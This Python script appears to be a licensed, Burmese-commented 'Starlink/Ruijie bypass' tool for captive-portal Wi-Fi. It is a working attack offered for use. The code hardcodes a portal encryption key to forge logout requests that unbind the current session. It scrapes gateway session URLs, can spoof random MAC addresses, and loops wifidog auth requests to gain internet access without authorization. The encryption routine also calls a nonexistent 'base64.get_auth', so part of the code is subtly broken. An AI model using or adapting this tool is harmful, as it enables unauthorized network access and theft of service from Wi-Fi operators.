import os
import re
import sys
import zlib
import time
import ping3
import base64
import random
import string
import urllib
import marshal
import getpass
import aiohttp
import asyncio
import hashlib
import argparse
import requests
import subprocess
import importlib.util
from datetime import timedelta, datetime
from urllib.parse import unquote
from Crypto.Util.Padding import pad
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# Color codes 
r, g, y, b, w, c = "\033[1;31m", "\033[1;32m", "\033[1;33m", "\033[1;34m", "\033[0m", "\033[1;36m"

# Server ပေါ်က Key စာရင်းဖတ်မယ့် Link
RAW_KEY_LINK = "https://raw.githubusercontent.com/paingkhant2701199/New_vers/refs/heads/main/key.txt"

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def Line():
    print(f"{y}-\033[1;00m"*os.get_terminal_size()[0])

def Logo():
    clear()
    logo = rf"""{c}
  ____             _       _       
 |  _ \ _   _ (_) (_)  ___| | ___  
 | |_) | | | | | | | |/ _ \ |/ _ \ 
 |  _ <| |_| | |_| | |  __/ |  __/ 
 |_| \_\\__,_|_(_) |_|\___|_|\___| 
               |__/                
                                             
          {w}>> {g}STARLINK BYPASS {w}<<
  {y}-----------------------------------------
   {w}Owner: {g}@paing07709
  {y}-----------------------------------------{w}"""
    print(logo)

# =====================================================================
# --- 🔑 KEY SYSTEM & LICENSE LOGIC START (UPDATED) ---
# =====================================================================

def get_device_id():
    """ စက်ရဲ့ ထူးခြားတဲ့ Device ID ကို ထုတ်ပေး/သိမ်းဆည်းပေးသည့် Logic """
    id_file = ".device_id"
    if os.path.exists(id_file): 
        return open(id_file, "r").read().strip()
    
    try:
        # စက်ရဲ့ Serial နံပါတ်ကို ယူခြင်း
        serial = os.popen("getprop ro.serialno").read().strip()
        # အကယ်၍ Serial မရှိလျှင် သို့မဟုတ် တိုလွန်းလျှင် Random စာလုံး ထုတ်ပေးခြင်း
        if not serial or len(serial) < 4:
            serial = "".join(random.choice(string.ascii_uppercase + string.digits) for _ in range(12))
            
        # အက္ခရာနှင့် ဂဏန်းများကို သန့်စင်ပြီး စာလုံးအကြီးပြောင်းခြင်း
        clean_serial = re.sub(r'[^A-Za-z0-9]', '', serial).upper()
        
        # 'RUI-' က ၄ လုံးရှိပြီးသားမို့လို့ ကျန်တဲ့ စာလုံးရေ ၆ လုံးပဲ ယူပြီး စုစုပေါင်း ၁၀ လုံး အတိအကျထွက်အောင် ဖြတ်ယူခြင်း
        if len(clean_serial) >= 6:
            final_serial = clean_serial[:6]
        else:
            # အကယ်၍ ၆ လုံးမပြည့်ပါက ကျန်တာကို 'X' ဖြင့် ဖြည့်ခြင်း
            final_serial = clean_serial.ljust(6, 'X')
            
        new_id = f"RUI-{final_serial}"
        with open(id_file, "w") as f: 
            f.write(new_id)
        return new_id
    except: 
        # တစ်ခုခုလွဲချော်ခဲ့ပါက Default ၁၀ လုံး စံသတ်မှတ်ချက်ပေးခြင်း
        return "RUI-UNKNOWN"

def get_network_time():
    """ စက်ထဲက အချိန်ကို လိမ်လို့မရအောင် Google Server ဆီက အချိန်အမှန်ကို ယူသည့် Logic """
    try:
        res = requests.get("https://www.google.com", timeout=5)
        gmt_str = res.headers.get('Date')
        gmt_dt = datetime.strptime(gmt_str, '%a, %d %b %Y %H:%M:%S %Z')
        mm_time = gmt_dt + timedelta(hours=6, minutes=30)
        return mm_time
    except: 
        return None

def parse_duration(duration_str):
    """ Server ပေါ်က ရက်စွဲစာသား (ဥပမာ- 30 Days, 5 Hours, 10 min) ကို ပြောင်းလဲပေးသည့် Logic """
    # Space ပါပါ မပါပါ ဖတ်နိုင်ရန်နှင့် စာလုံးအပြည့်/အတိုကောက်များ ဖတ်နိုင်ရန် Regex ပြင်ဆင်မှု
    days = re.search(r'(\d+)\s*(d|day|days)', duration_str, re.I)
    hours = re.search(r'(\d+)\s*(h|hour|hours)', duration_str, re.I)
    minutes = re.search(r'(\d+)\s*(m|min|minute|minutes)', duration_str, re.I)
    
    d = int(days.group(1)) if days else 0
    h = int(hours.group(1)) if hours else 0
    m = int(minutes.group(1)) if minutes else 0
    return timedelta(days=d, hours=h, minutes=m)

def format_countdown(expiry_dt, current_dt):
    """ သက်တမ်းကုန်ဆုံးရန် ကျန်ရှိသော အချိန်ကို တွက်ချက်ပြသပေးသည့် Logic """
    diff = expiry_dt - current_dt
    if diff.total_seconds() <= 0: 
        return "Expired"
    days = diff.days
    hours, rem = divmod(diff.seconds, 3600)
    minutes, seconds = divmod(rem, 60)
    return f"{days}D, {hours}H, {minutes}M, {seconds}S"

def check_online_license(user_key):
    """ Key စစ်ဆေးခြင်း နှင့် သက်တမ်း ကုန်/မကုန် Logic အဓိကအပိုင်း """
    dev_id = get_device_id()
    key_file = ".access_key"
    last_time_file = ".last_seen"
    
    net_time = get_network_time()
    curr_sys_time = datetime.now()
    
    if os.path.exists(last_time_file):
        try:
            last_ts = float(open(last_time_file, "r").read().strip())
            if curr_sys_time.timestamp() < last_ts:
                return False, "Time Travel Detected! Fix your date."
        except: 
            pass
            
    current_working_time = net_time if net_time else curr_sys_time
    
    with open(last_time_file, "w") as f: 
        f.write(str(current_working_time.timestamp()))
        
    try:
        res = requests.get(RAW_KEY_LINK, timeout=10)
        if res.status_code == 200:
            lines = res.text.splitlines()
            for line in lines:
                if "|" in line:
                    parts = [p.strip() for p in line.split("|")]
                    if parts[0] == dev_id and parts[1] == user_key:
                        raw_duration = parts[2]
                        
                        if os.path.exists(key_file):
                            saved_data = open(key_file, "r").read().strip().split("|")
                            expiry_dt = datetime.fromtimestamp(float(saved_data[1]))
                        else:
                            if not net_time: 
                                return None, "Activation requires internet!"
                            delta = parse_duration(raw_duration)
                            if delta.total_seconds() == 0: 
                                return False, "Invalid Duration!"
                            
                            expiry_dt = net_time + delta
                            with open(key_file, "w") as f: 
                                f.write(f"{user_key}|{expiry_dt.timestamp()}")
                        
                        if current_working_time < expiry_dt: 
                            return True, expiry_dt
                        else:
                            if os.path.exists(key_file): 
                                os.remove(key_file)
                            return False, "Key Expired!"
                            
            return False, "Key not found on Server!"
    except:
        if os.path.exists(key_file):
            try:
                s_key, s_exp_ts = open(key_file, "r").read().strip().split("|")
                expiry_dt = datetime.fromtimestamp(float(s_exp_ts))
                if curr_sys_time < expiry_dt: 
                    return True, expiry_dt
                else: 
                    return False, "Expired (Offline)"
            except: 
                pass
        return None, "Connection Error!"
    return False, "Access Denied"

async def background_license_sync(user_key, current_expiry_dt):
    """ အသုံးပြုသူ Menu ထဲရောက်နေစဉ် နောက်ကွယ်မှ GitHub ဆီ လှမ်းစစ်ပြီး လိုင်စင်အား Auto-Update ပြုလုပ်ပေးမည့် အပိုင်း """
    global global_expiry_info
    key_file = ".access_key"
    
    while True:
        await asyncio.sleep(15) # ၁၅ စက္ကန့်လျှင် တစ်ကြိမ် နောက်ကွယ်မှ စစ်ဆေးမည်
        try:
            # Server က လိုင်စင်အခြေအနေကို ဆွဲယူခြင်း
            loop = asyncio.get_event_loop()
            status, info = await loop.run_in_executor(None, check_online_license, user_key)
            
            if status is True:
                # အကယ်၍ သက်တမ်းပြောင်းလဲသွားပါက (ဥပမာ- သက်တမ်းတိုးပေးလိုက်ခြင်း) စက်ထဲကဖိုင်ကို အလိုအလျောက် Update လုပ်မည်
                global_expiry_info = info
                with open(key_file, "w") as f: 
                    f.write(f"{user_key}|{info.timestamp()}")
            elif status is False:
                # Key ကို Block လိုက်ခြင်း သို့မဟုတ် သက်တမ်းအမှန်တကယ်ကုန်သွားပါက Tool ကို ချက်ချင်း ပိတ်ပစ်မည်
                print(f"\n{r}[!] License Update: {info} Tool Closing...{w}")
                if os.path.exists(key_file): 
                    os.remove(key_file)
                os._exit(0)
        except:
            pass # အင်တာနက်မရှိသေးပါက သို့မဟုတ် Error တက်ပါက လျစ်လျူရှုပြီး နောက်တစ်ကြိမ်ပြန်စစ်မည်

# =====================================================================
# --- 🔑 KEY SYSTEM & LICENSE LOGIC END ---
# =====================================================================


# --- Security Functions for Secret Key Magic ---
def decode_secret_key(secret_key: str) -> str:
    try:
        b64_decoded = base64.b64decode(secret_key.encode('utf-8')).decode('utf-8')
        original_url = b64_decoded[::-1]
        return original_url
    except Exception:
        return ""

class WifiSetup:
    def __init__(self):
        self.baseurl = "http://10.44.77.240:2060"
        self.username_get_url = self.baseurl + "/username_get"
        self.online_info_url = self.baseurl + "/user/online_info"
        self.logout_url = self.baseurl + "/user/logout"
        self.enc_key = "RjYkhwzx$2018!" 

    def start_setup(self):
        Logo()
        print(f"\n{c}[*] Starting Ruijie Wi-Fi Setup...{w}")
        
        status = self.unbind()
        Line()
        if not status:
            print(f"{y}[!] Warning: Unbind old session failed! (Might be a new connection){w}")
        else:
            print(f"{g}[+] Old session unbinded successfully!{w}")
            print(f"{c}[*] Waiting 6 seconds for new data...{w}")
            time.sleep(6)
        Line()

        print(f"{c}[*] Fetching new router details...{w}")
        try:
            localhost = requests.get("http://192.168.0.1", timeout=10).url
            ip = re.search('gw_address=(.*?)&', localhost).group(1)
            
            headers = {
                'authority': 'portal-as.ruijienetworks.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'referer': localhost,
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            }
            
            req = requests.get(localhost, headers=headers).text
            path = re.search("href='(.*?)'</script>", req).group(1)
            session_url = "https://portal-as.ruijienetworks.com" + path
            
            with open(".session_url", "w") as f:
                f.write(session_url)
            with open(".ip", "w") as f:
                f.write(ip)
                
            Line()
            print(f"{g}[Success] Setup Completed!{w}")
            print(f"{b}[+] Saved IP: {w}{ip}")
            print(f"{b}[+] Saved Session URL:\n{w}{session_url}")
            Line()
            
        except Exception as err:
            print(f"{r}[!] Error: Setup failed! Reason: {err}{w}")

    def unbind(self):
        username = self.username_get()
        if not username:
            return False
        online_info = self.get_online_info(username)
        if not online_info:
            return False
        data = self.arrange_data(online_info)
        return self.logout(data, username)

    def username_get(self):
        try:
            req = requests.get(self.username_get_url, timeout=5).json()
            return req.get("username", None)
        except:
            return None
    
    def get_online_info(self, username):
        params = {"username": username, "usertype": "wifidog"}
        try:
            req = requests.get(self.online_info_url, params=params, timeout=5).json()
            return req["data"]["list"][0]
        except:
            return None

    def arrange_data(self, info):
        repmac = info["mac"].replace(":", "")
        repmac = [repmac[i:i+4] for i in range(0, len(repmac), 4)]
        mac_req = ".".join(repmac)
        return {
            "ip": info["ip"],
            "mac": info["mac"],
            "ip_req": info["ip"],
            "mac_req": mac_req
        }

    def get_data(self):
        try:
            return requests.get(self.baseurl, timeout=5).text
        except:
            return None

    def extract_chap(self, data):
        match = re.search(r"chap_id=([^&]+)&chap_challenge=([^']+)", data)
        if not match:
            return None
        return {"chap_id": match.group(1), "chap_challenge": match.group(2)}
    
    def encrypt_cryptojs(self, auth, enc_key):
        salt = get_random_bytes(8)
        key_iv = b''
        prev = b''
        while len(key_iv) < 48:
            prev = hashlib.md5(prev + enc_key.encode("utf-8") + salt).digest()
            key_iv += prev
        key = key_iv[:32]
        iv = key_iv[32:48]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        padded_data = pad(auth.encode("utf-8"), AES.block_size)
        cipher_text = cipher.encrypt(padded_data)
        encrypted_data = b"Salted__" + salt + cipher_text
        return base64.get_auth(encrypted_data).decode("utf-8")

    def get_auth(self, username):
        data = self.get_data()
        if not data:
            print(f"{r}[!] Failed to get base data.{w}")
            return None
        chaps = self.extract_chap(data)
        if not chaps:
            print(f"{r}[!] Failed to extract chap parameters.{w}")
            return None
        chap_id_decoded = urllib.parse.unquote(chaps["chap_id"])
        chap_challenge_decoded = urllib.parse.unquote(chaps["chap_challenge"])
        auth = chap_id_decoded + chap_challenge_decoded + username
        return self.encrypt_cryptojs(auth, self.enc_key)

    def logout(self, data, username):
        auth = self.get_auth(username)
        if not auth:
            return False
        payload = f"ip={data['ip']}&mac={data['mac']}&ip_req={data['ip_req']}&mac_req={data['mac_req']}&auth={auth}"
        try:
            respond = requests.post(self.logout_url, data=payload, timeout=5).json()
            return bool(respond.get("success"))
        except:
            return False

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

async def get_session_id(session, session_url, previous_session_id, rep_mac=True):
    if rep_mac:
        mac = get_mac()
        session_url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0'
    }
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id:
                return session_id.group(1)
            else:
                return False
    except:
        return previous_session_id

class InternetAccess:
    def __init__(self):
        Logo()
        try:
            self.ip = open('.ip', 'r').read().strip()
        except FileNotFoundError:
            print(f"{r}[!] IP not found, try again after setup{w}")
            sys.exit(0)
            
        try:
            secret_key = open('.access_data', 'r').read().strip()
        except FileNotFoundError:
            secret_key = input(f"{g}[+] Enter Your Secret Key: {w}").strip()
      
        self.decode_access_data = self.decode_data(secret_key)
        
        if not self.decode_access_data:
            print(f"{r}[!] Invalid Secret Key format!{w}")
            sys.exit(0)
    
    async def main(self):
        await execute(self.decode_access_data, self.ip)

    def decode_data(self, secret_key):
        with open(".access_data", "w") as f:
            f.write(secret_key)
        
        original_url = decode_secret_key(secret_key)
        print(f"\n[DEBUG] Secret Key Loaded Successfully.")
        return original_url
    
async def get_ping():
    ping = await asyncio.to_thread(ping3.ping, "google.com")
    if ping is None:
        return f"{r}Unknown{w}"
    else:
        ping = int(ping * 1000)
        if ping >= 100:
            return f"{r}{str(ping)}{w}"
        elif ping >= 90:
            return f"{y}{str(ping)}{w}"
        elif ping < 90:
            return f"{g}{str(ping)}{w}"

async def execute(decode_access_data, ip):
    timeout = aiohttp.ClientTimeout(total=20)
    connector = aiohttp.TCPConnector(limit=1024)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        try:
            while True:
                previous_session_id = None
                while True:
                    print(f"{g}[*] Getting session id...{w}")
                    Line()
                    session_id = await get_session_id(session, decode_access_data, previous_session_id, rep_mac=False)
                    if session_id is False:
                        print(f"{y}[!] Session ID Not Found{w}")
                        Line()
                        print(f"{y}[*] Will Try Again After 100 seconds{w}")
                        Line()
                        time.sleep(100)
                        session_id = await get_session_id(session, decode_access_data, previous_session_id, rep_mac=False)
                    elif session_id is None:
                        print(f"{y}[!] Session ID Not Found{w}")
                        Line()
                        print(f"{y}[*] Will Try Again After 5 seconds{w}")
                        Line()
                        time.sleep(5)
                        session_id = await get_session_id(session, decode_access_data, previous_session_id, rep_mac=False)
                    elif session_id:
                        previous_session_id = session_id
                        print(f"{g}[+] Found Session ID: {session_id}{w}")
                        Line()
                        break
                for i in range(3):
                    send_status = await send(session, ip, session_id)
                    if not send_status:
                        print(f"{r}[!] Internet Bypass Failed, Secret Key/Session May Expired{w}")
                        Line()
                        print(f"{g}[+] Getting Ping...{w}")
                        Line()
                        ping = await get_ping()
                        print(f"{b}[*] Current Ping is {ping}{w}")
                        Line()
                    else:
                        print(f"{g}[+] Internet Bypass Active{w}")
                        Line()
                        print(f"{g}[+] Testing Ping...{w}")
                        Line()
                        ping = await get_ping()
                        print(f"{b}[*] Current Ping is {ping}{w}")
                        Line()
                    time.sleep(10)
                time.sleep(5)
        except KeyboardInterrupt:
            print(f"{y}[*] User cancel called{w}")
            sys.exit(0)
        except Exception as e:
            print(f"{r}[!] Process was stopped{w}")
            sys.exit(0)
    
async def send(session, ip, session_id):
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    params = {
        'token': session_id,
        'phoneNumber': 'HELLO WORLD',
    }
    try:
        async with session.get(f'http://{ip}:2060/wifidog/auth?', params=params, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            if "http://www.baidu.com" == response or "http://www.baidu.com/" == response or "http://portal-as.ruijienetworks.com/download/static/maccauth/src/success.html?" in response:
                return True
            else:
                return False
    except Exception as e:
        print(f"{y}[!] Sending Packages failed{w}")
        Line()
        time.sleep(1.5)
        print(f"{y}[*] Trying to Send Again...{w}")
        Line()
        time.sleep(1.5)
        return await send(session, ip, session_id)

def replace_mac(url, new_mac):
    url = re.sub(r'(?<=mac=)[^&]+', new_mac, url)       
    return url

def show_menu(remaining_time):
    print(f"""{c}
  ┌───────────────────────────────────────┐
  │            RUIJIE SYSTEM              │
  ├───────────────────────────────────────┤
  │  {w}[1] {g}⚙️  Wi-Fi Setup                   {c}│
  │  {w}[2] {g}🚀  Internet Bypass                {c}│
  │  {w}[3] {r}❌  Logout                         {c}│
  ├───────────────────────────────────────┤
  │  {y}⏳ License Left: {g}{remaining_time:<20}{c}│
  └───────────────────────────────────────┘{w}""")

# Live Expiry Info အတွက် Global variable သတ်မှတ်ခြင်း
global_expiry_info = None

async def main():
    global global_expiry_info
    # --------------------------------------------------------
    # 🚀 STEP 1: Tool စ run တတာနဲ့ Key စစ်ဆေးမည့် အပိုင်း (Offline First)
    # --------------------------------------------------------
    Logo()
    dev_id = get_device_id()
    key_file = ".access_key"
    
    print(f"{b}[>] Device ID: {w}{dev_id}")
    Line()
    
    saved_key = ""
    is_offline_login = False
    
    if os.path.exists(key_file):
        try: 
            saved_key = open(key_file, "r").read().strip().split("|")[0]
            is_offline_login = True
        except: 
            pass
            
    user_key = saved_key if saved_key else input(f"{y}[?] Enter Access Key: {w}").strip()
    
    if is_offline_login:
        # Offline သို့မဟုတ် Local ကနေ အရင်ဆုံး ဖတ်ပြီး Menu ထဲ ချက်ချင်းပေးဝင်ရန်
        try:
            s_key, s_exp_ts = open(key_file, "r").read().strip().split("|")
            global_expiry_info = datetime.fromtimestamp(float(s_exp_ts))
            if datetime.now() >= global_expiry_info:
                print(f"{r}[!] Saved Key Expired!{w}")
                os.remove(key_file)
                sys.exit(0)
            print(f"{g}[+] Saved License Loaded! Entering Menu...{w}")
            time.sleep(1.5)
        except:
            is_offline_login = False

    if not is_offline_login:
        # ဖြတ်သန်းမှုအသစ် သို့မဟုတ် ဖိုင်ပျက်နေလျှင် Online မှ အရင်စစ်မည်
        print(f"{c}[*] Verifying Access Key with Server...{w}")
        status, info = check_online_license(user_key)
        
        if status is True:
            global_expiry_info = info
            remaining = format_countdown(info, datetime.now())
            print(f"{g}[+] Access Granted!{w}")
            print(f"{y}[!] Remaining Time: {g}{remaining}{w}")
            time.sleep(2)
        elif status is False:
            if os.path.exists(key_file): 
                os.remove(key_file)
            print(f"{r}[!] Access Denied: {info}{w}")
            sys.exit(0)
        else:
            print(f"{r}[!] Network Notification: {info}{w}")
            sys.exit(0)
            
    # --------------------------------------------------------
    # 🔄 STEP 2: နောက်ကွယ်မှ Auto-Update ပုံစံ Task စတင်ခြင်း
    # --------------------------------------------------------
    asyncio.create_task(background_license_sync(user_key, global_expiry_info))
        
    # --------------------------------------------------------
    # 📊 STEP 3: Main Menu အပိုင်း
    # --------------------------------------------------------
    while True:
        Logo()
        current_remaining = format_countdown(global_expiry_info, datetime.now())
        show_menu(current_remaining)
        
        choice = input(f"  {y}Choose Menu >>> {w}").strip()
        
        if choice == '1':
            setup = WifiSetup()
            setup.start_setup()
            input(f"\n{y}Press Enter to return to menu...{w}")
            
        elif choice == '2':
            print(f"\n{g}[*] Starting Internet Bypass...{w}")
            access = InternetAccess()
            await access.main()
            break 
            
        elif choice == '3':
            print(f"\n{r}[+] Exiting...{w}")
            sys.exit(0)
            
        else:
            print(f"\n{r}[!] Invalid choice!{w}")
            time.sleep(1)

def start_program():
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{r}[!] Program stopped.{w}")
        sys.exit(0)

if __name__ == "__main__":
    start_program()
